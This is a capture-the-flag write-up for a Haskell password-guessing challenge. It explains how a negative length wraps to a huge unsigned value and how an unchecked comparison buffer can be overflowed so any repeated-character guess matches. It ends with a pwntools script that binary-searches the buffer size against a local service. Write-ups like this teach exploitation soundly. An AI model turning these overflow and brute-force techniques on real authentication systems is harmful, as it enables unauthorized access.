# Passwordle 2.0

Author: Sean (beanbeah)

## Description

Passwordle 2.0. You've seen passwordle, but its TOO EASYY. Passwordle 2.0 aims to fix that by giving you only ONE chance to guess the password! Guess the password correctly and get a flag. To make it slightly easier, you can specify the length of the password you want to guess (maybe guessing a 2 char password is easier than a 100 char password???)

## Hints
1. Release the original source code `original.hs` 
2. Maybe there's a way to trick the program to read more input?
3. Have you heard of binary search?


## Solution

It should be noted there are 2 vulnerabilities in the program.
1) Converting Signed Integers to Unsigned Integers 
2) Vulnerable comparison function

For the purpose of this writeup, we will be using the original source code. 

Notice in function `checkSize` (function `b`), an Integer value is converted to a Word value (unsigned integer)
```
checkSize :: Integer -> Word
checkSize size | (size >= 100) = fromInteger(16) :: Word
               | (size >= 0 && size <= 2) = fromInteger(2) :: Word
               | (size < 100) = fromInteger(size) :: Word
```
By sending a negative number such as `-1`, we will instead get a huge value since there is a wrap around when converting negative numbers to unsigned integers. By sending `-1`, we can get unlimited input since our input is restricted by function `nChars` or function `c`. 

The comparison function (`strcmp` or function `d`) is as follows:
```
strcmp :: Int -> ByteString -> ByteString -> IO Bool
strcmp len s1 s2 =
    allocaArray len $ \b1 -> do
        let l = len `div` 2
            l1 = BS.length s1
            l2 = BS.length s2
            b2 = plusPtr b1 16
        when (l1 > len || l2 > len) $ exitFailure
        pokeArray b2 (BS.unpack s2)
        when (l2 < l) $ pokeArray (plusPtr b2 l2) (replicate (l - l2) (0 :: Word8))
        pokeArray b1 (BS.unpack s1)
        when (l1 < l) $ pokeArray (plusPtr b1 l1) (replicate (l - l1) (0 :: Word8))
        and <$> forM [0..(l-1)] (\i -> do
            c1 <- peekByteOff b1 i :: IO Word8
            c2 <- peekByteOff b2 i
            return $ c1 == c2)
```

Notice, there is no length check performed on both strings, apart from making sure they do not exceed `len`. 
HOWEVER, notice that this comparison is insecure. 

The comparison function performs the following:
1) allocate an array of size `len`
2) copy over our acutal password (s2) into (`len`/2 -1) index to the end of the array
3) copy over our guess (s1) into the start of the array onwards. 
4) Loop through the array ensuring that 
       Index 0 equals Index (`len`/2 -1) 
       Index 1 equals Index (`len`/2 -1) + 1 
       Index 2 equals Index (`len`/2 -1) + 2
       ... 
       Index (`len`/2) equals Index (`len`-1) 

Notice since we never check that s1 or s2 is more than half the size of the array, we can overflow the allocated array. 
By sending `len` * "A", we can overflow and overwrite the contents of s2 in the array. 
During step 4, the function will return TRUE since all the chars in the array of `len` are the same ("A" in this case)

However, we still have not figured out what is the value of `len`.
It would be unwise to iterate from 1 to 800000 to find someNum. However, we can binary search!
Notice that when our guess is less than `len`, the program tells us our guess is wrong. 
When our guess is more than `len`, the program exits. 

Combining all this together, we obtain the following script!

```
from pwn import *
def send(p,num):
    p.recvuntil("Input the length of password to randomly generate:")
    p.sendline("-1")
    p.recvuntil("Enter your guess:")
    p.sendline(b"A"*num)
    p.recvline()
    return p.recvline()

r = 800000
l = 0

while (l < r):
    mid = (l + r) // 2
    p = remote("0.0.0.0",1337)
    try: 
        response = send(p,mid)
        if response == b"Sorry, your guess is wrong. Try again next time!\n":
            l = mid + 1
            p.close()
        elif response == b'Congrats! You guessed the password!\n':
            print(p.recvline())
            p.close()
            exit()
    except:
        #assume something went wrong
        r = mid -1
        p.close()
```
